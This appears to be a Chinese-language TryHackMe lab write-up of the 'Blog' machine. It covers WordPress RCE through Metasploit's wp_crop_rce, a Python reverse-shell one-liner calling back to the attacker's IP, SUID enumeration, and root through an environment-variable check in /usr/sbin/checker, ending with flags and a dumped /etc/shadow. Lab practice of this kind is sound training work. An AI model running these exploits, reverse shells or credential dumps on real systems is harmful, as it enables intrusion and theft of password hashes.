---
layout: post
title: "Blog SUID privesc"
date: "2023-08-03"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# Blog SUID privesc
WordPress只暴力破解出一个有效用户名和密码：

login: kwheel password: cutiepie1

Kali Linux : 10.18.72.222

Target IP Address : 10.10.144.150

```
msf6 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.117.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.144.150
RHOSTS => 10.10.144.150
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set LHOST 10.18.72.222
LHOST => 10.18.72.222
msf6 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on 10.18.72.222:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.144.150
[*] Meterpreter session 1 opened (10.18.72.222:4444 -> 10.10.144.150:36074) at 2023-08-02 22:07:00 -0400
[*] Attempting to clean up files...

meterpreter > sysinfo
Computer    : blog
OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data
```

[cheat sheet Basic Linux Privilege Escalation.txt](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Cheat%20sheets%20reference%20pages%20Checklists%20-/Linux/cheat%20sheet%20Basic%20Linux%20Privilege%20Escalation.txt)

```
find / -perm -1000 -type d 2>/dev/null
```

这个命令使用Linux中的`find`命令来查找特定权限的目录，并将结果输出到标准输出（stdout）。让我来解释每个部分：

1. `find`: 这是Linux/Unix系统中的一个强大的查找工具。它用于在指定目录及其子目录中查找文件和目录。

2. `/`: 这是要搜索的起始目录。在这个命令中，它表示从根目录开始搜索，也就是整个文件系统。

3. `-perm -1000`: 这是`find`命令的一个选项，用于指定要搜索的文件或目录的权限。在这里，`-perm`选项用于指定搜索具有特定权限的文件或目录。`-1000`表示以八进制表示法定义的权限值。在八进制表示法中，`1000`对应于权限为"u+sx"，即用户拥有可执行和设置UID权限的文件或目录。设置UID权限允许用户以拥有该文件或目录所有者的权限来执行它。在这里，我们搜索具有这个权限的目录。

4. `-type d`: 这是`find`命令的另一个选项，用于限制搜索结果的类型。在这里，`-type d`表示只搜索目录。

5. `2>/dev/null`: 这部分用于重定向标准错误（stderr）输出。在Linux中，数字2表示标准错误流。`/dev/null`是一个特殊的设备文件，它可以被用作一个空设备，可以将不需要的输出发送到这个设备以丢弃它们。因此，`2>/dev/null`表示将标准错误输出重定向到空设备，这样错误信息就不会显示在终端上。

综上所述，该命令的目的是从整个文件系统中查找拥有权限"u+sx"（设置UID）的目录，并将结果输出到终端，同时忽略任何错误信息。

```
find / -perm -g=s -type f 2>/dev/null
```

这个命令使用Linux中的`find`命令来查找特定权限的文件，并将结果输出到标准输出（stdout）。让我来解释每个部分：

1. `find`: 这是Linux/Unix系统中的一个强大的查找工具。它用于在指定目录及其子目录中查找文件和目录。

2. `/`: 这是要搜索的起始目录。在这个命令中，它表示从根目录开始搜索，也就是整个文件系统。

3. `-perm -g=s`: 这是`find`命令的一个选项，用于指定要搜索的文件或目录的权限。在这里，`-perm`选项用于指定搜索具有特定权限的文件或目录。`-g=s`表示以八进制表示法定义的权限值。在八进制表示法中，`g`表示文件所属组的权限，而`s`表示特殊权限中的设置组ID权限。设置组ID权限会在文件执行时暂时更改执行该文件的进程的组ID为该文件所属组的ID。在这里，我们搜索具有设置组ID权限的文件。

4. `-type f`: 这是`find`命令的另一个选项，用于限制搜索结果的类型。在这里，`-type f`表示只搜索普通文件（非目录）。

5. `2>/dev/null`: 这部分用于重定向标准错误（stderr）输出。在Linux中，数字2表示标准错误流。`/dev/null`是一个特殊的设备文件，它可以被用作一个空设备，可以将不需要的输出发送到这个设备以丢弃它们。因此，`2>/dev/null`表示将标准错误输出重定向到空设备，这样错误信息就不会显示在终端上。

综上所述，该命令的目的是从整个文件系统中查找拥有设置组ID权限的普通文件，并将结果输出到终端，同时忽略任何错误信息。这可能有助于找到那些具有设置组ID权限的文件，以便进一步检查和审查安全性。

```
find / -perm -u=s -type f 2>/dev/null
```

这个命令使用Linux中的`find`命令来查找特定权限的文件，并将结果输出到标准输出（stdout）。让我来解释每个部分：

1. `find`: 这是Linux/Unix系统中的一个强大的查找工具。它用于在指定目录及其子目录中查找文件和目录。

2. `/`: 这是要搜索的起始目录。在这个命令中，它表示从根目录开始搜索，也就是整个文件系统。

3. `-perm -u=s`: 这是`find`命令的一个选项，用于指定要搜索的文件或目录的权限。在这里，`-perm`选项用于指定搜索具有特定权限的文件或目录。`-u=s`表示以八进制表示法定义的权限值。在八进制表示法中，`u`表示文件所有者的权限，而`s`表示特殊权限中的设置用户ID权限。设置用户ID权限会在文件执行时暂时更改执行该文件的进程的用户ID为该文件的所有者的ID。在这里，我们搜索具有设置用户ID权限的文件。

4. `-type f`: 这是`find`命令的另一个选项，用于限制搜索结果的类型。在这里，`-type f`表示只搜索普通文件（非目录）。

5. `2>/dev/null`: 这部分用于重定向标准错误（stderr）输出。在Linux中，数字2表示标准错误流。`/dev/null`是一个特殊的设备文件，它可以被用作一个空设备，可以将不需要的输出发送到这个设备以丢弃它们。因此，`2>/dev/null`表示将标准错误输出重定向到空设备，这样错误信息就不会显示在终端上。

综上所述，该命令的目的是从整个文件系统中查找拥有设置用户ID权限的普通文件，并将结果输出到终端，同时忽略任何错误信息。这可能有助于找到那些具有设置用户ID权限的文件，以便进一步检查和审查安全性。设置用户ID权限的文件可能会导致安全漏洞，因此需要仔细审查它们。

搜索具有设置用户ID权限的文件：

```
meterpreter > shell
Process 1636 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (1073): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blog:/var/www/wordpress$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
```

注意：这里建议获取一个reverse shell。而不是直接在meterpreter shell中执行，因为后者执行/bin/bash有些问题。

[Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.72.222",4433));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```
┌──(root㉿kali)-[~]
└─# nc -vnlp 4433
listening on [any] 4433 ...
connect to [10.18.72.222] from (UNKNOWN) [10.10.144.150] 33938
$ whoami
whoami
www-data
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

[GTFOBins](https://gtfobins.github.io/)

GTFOBins

GTFOBins是一个由精心策划的Unix二进制文件列表，可以用来绕过在配置错误的系统中的本地安全限制。

该项目收集了Unix二进制文件的合法功能，可以被滥用来打破受限的shell、升级或保持提升的权限、传输文件、生成绑定和反向shell，以及促进其他后渗透任务。

需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不易受攻击。相反，GTFOBins是一个关于如何在仅有某些二进制文件的情况下生存下来的汇编。

GTFOBins是由Emilio Pinna和Andrea Cardaci创建的合作项目，每个人都可以贡献额外的二进制文件和技术。

如果你正在寻找Windows二进制文件，你可以访问LOLBAS。

|Binary|Functions|
|---|---|
|pkexec|Sudo|
|at|Shell, Command, Sudo|
|mount|Sudo|
|su|Sudo|

发现非常见二进制文件：/usr/sbin/checker

```
$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
```

`ltrace`是一个Linux下的调试工具，它用于跟踪应用程序调用的动态库函数。它可以用来监视程序执行时调用的所有函数，包括C库函数和其他动态链接库中的函数。`ltrace`的主要用途是帮助程序员或系统管理员分析和调试程序，查找程序中的问题，以及理解程序的执行过程。

以下是`ltrace`的一些主要特点和用途：

1. **函数调用跟踪**：`ltrace`可以在程序执行时，记录所有被调用的函数，包括函数的参数和返回值。这对于了解程序的执行流程、函数调用关系以及参数传递非常有用。

2. **库函数监视**：`ltrace`特别适用于监视C库函数和其他动态链接库的函数调用。它可以捕获程序对这些库函数的调用和使用情况。

3. **性能分析**：通过分析函数调用和执行时间，`ltrace`可以帮助找到程序中的性能瓶颈和不效率的部分。

4. **动态链接库问题排查**：当程序运行时出现与动态链接库相关的问题时，`ltrace`可以帮助定位问题，找到调用错误或者缺失的库函数。

5. **调试工具辅助**：在程序调试过程中，`ltrace`可以与其他调试工具（如`gdb`）结合使用，提供更全面的信息，帮助快速发现和解决问题。

使用`ltrace`时，你可以通过以下命令来运行它：

```bash
ltrace [options] [command]
```

其中，`[options]`是一些可选参数，可以用来定制输出和过滤结果；`[command]`是要跟踪的程序的命令。执行`ltrace`后，它会显示出程序执行期间调用的函数和相关信息。

需要注意的是，`ltrace`只能跟踪动态链接库函数的调用，而不能跟踪静态链接库或静态函数的调用。对于静态链接库和静态函数的跟踪，可以使用其他调试工具（如`gdb`）进行处理。

```
$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

根据你提供的`ltrace`输出，我们可以看出以下信息：

2. `ltrace /usr/sbin/checker` 是你运行的`ltrace`命令，带上了要跟踪的程序`/usr/sbin/checker`。

3. `getenv("admin") = nil` 表示程序在运行时调用了`getenv`函数来获取环境变量"admin"的值，但该环境变量并未设置，因此返回了空指针（`nil`）。

4. `puts("Not an Admin") = 13` 表示程序调用了`puts`函数，将字符串"Not an Admin"输出到终端，并输出的字符数为13。

5. `Not an Admin` 是程序输出的字符串，它显示了“Not an Admin”这个消息。

6. `+++ exited (status 0) +++` 表示程序成功地退出了，退出状态码为0，这表示程序正常执行结束。

综上所述，这个`ltrace`输出显示了`/usr/sbin/checker`程序在运行时尝试获取名为"admin"的环境变量的值，但没有找到该环境变量，所以输出了"Not an Admin"这个消息，并正常地退出。

检查所有的环境变量，没有名为"admin"的环境变量：

```
$ echo $admin
echo $admin

```

设置环境变量"admin"的值：

```
$ export admin=1
export admin=1
$ echo $admin
echo $admin
1
```

重新执行并跟踪/usr/sbin/checker：

```
$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/var/www/wordpress# whoami
whoami
root
root@blog:/var/www/wordpress# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

```
root@blog:/var/www/wordpress# ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = "1"
setuid(0)                                        = 0
system("/bin/bash"
```

根据你提供的`ltrace`输出，我们可以看出以下信息：

1. `root@blog:/var/www/wordpress#` 是你当前登录的用户和目录提示符。这里显示你是以root用户身份登录。

2. `ltrace /usr/sbin/checker` 是你运行的`ltrace`命令，带上了要跟踪的程序`/usr/sbin/checker`。

3. `getenv("admin") = "1"` 表示程序在运行时调用了`getenv`函数来获取环境变量"admin"的值，并且该环境变量的值为"1"。

4. `setuid(0) = 0` 表示程序在运行时调用了`setuid`函数，将用户ID设置为0，即切换为root用户，并且这一步成功了。

5. `system("/bin/bash"` 表示程序在运行时调用了`system`函数，执行了一个命令`/bin/bash`，即启动一个新的Bash shell。由于之前已经成功切换为root用户，因此这一步将以root权限启动一个新的Bash shell。

这个`ltrace`输出显示了`/usr/sbin/checker`程序在运行时尝试获取名为"admin"的环境变量的值，并找到了该环境变量，其值为"1"。然后程序使用`setuid`函数将用户ID设置为0，即切换为root用户，然后以root权限启动了一个新的Bash shell。由于你是以root用户身份登录并运行`ltrace`，所以`setuid(0)`调用成功。

```
root@blog:/var/www/wordpress# cd /root
cd /root
root@blog:/root# ls
ls
root.txt
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
root@blog:/root# find / -name user.txt 2>/dev/null
find / -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/root# cat /home/bjoel/user.txt
cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
root@blog:/root# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```

```
root@blog:/root# cat /etc/shadow
cat /etc/shadow
root:$6$zdXcsFNB$WV2Erzzi.p2q6L8mVTs1ko7qHxTHlmkfh4udejwYnrUq2uXm1OouYvkH1a35tOTjc9Sw01.fXG1YxfTY06Bbp/:18409:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18407:0:99999:7:::
bjoel:$6$sQQx807w$uTila3vji9gd0UxKOOonvPYrKMZn4Hu1ur8LAoDdX.6bBtNITo8smn2KsWThXYyK5CnX.d6AhhFyVTnRyTcsa1:18409:0:99999:7:::
mysql:!:18408:0:99999:7:::
smb:!:18408:0:99999:7:::
```